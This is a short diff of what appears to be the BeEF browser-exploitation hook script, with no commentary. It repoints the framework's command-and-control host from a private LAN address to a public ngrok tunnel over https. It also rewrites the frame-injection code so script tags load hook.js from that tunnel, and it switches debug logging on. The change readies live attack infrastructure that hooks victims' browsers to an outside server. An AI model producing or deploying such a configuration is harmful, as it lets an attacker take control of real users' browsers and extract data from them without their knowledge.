@@ -5207,7 +5207,7 @@ if(typeof beef === 'undefined' && typeof window.beef === 'undefined') {
          * @param: {string} the debug string to return
          */
         debug: function(msg) {
-            isDebug = 'false'
+            isDebug = 'true'
             if (typeof console == "object" && typeof console.log == "function" && isDebug === 'true') {
                 var currentdate = new Date();
                 var pad = function(n){return ("0" + n).slice(-2);}
@@ -8938,7 +8938,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'http://10.81.1.131:3000/hook.js';
+        script.src = 'https://emerging-filly-skilled.ngrok-free.app:443/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
@@ -11695,10 +11695,10 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "10.81.1.131",
-    port: "3000",
+    host: "emerging-filly-skilled.ngrok-free.app",
+    port: "443",
     hook: "/hook.js",
-    httpproto: "http",
+    httpproto: "https",
     handler: '/dh',
     chop: 500,
     pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
@@ -14105,4 +14105,3 @@ beef.regCmp("beef.are");
   * @function setTimeout 
   */
 setTimeout(beef_init, 1000);
-
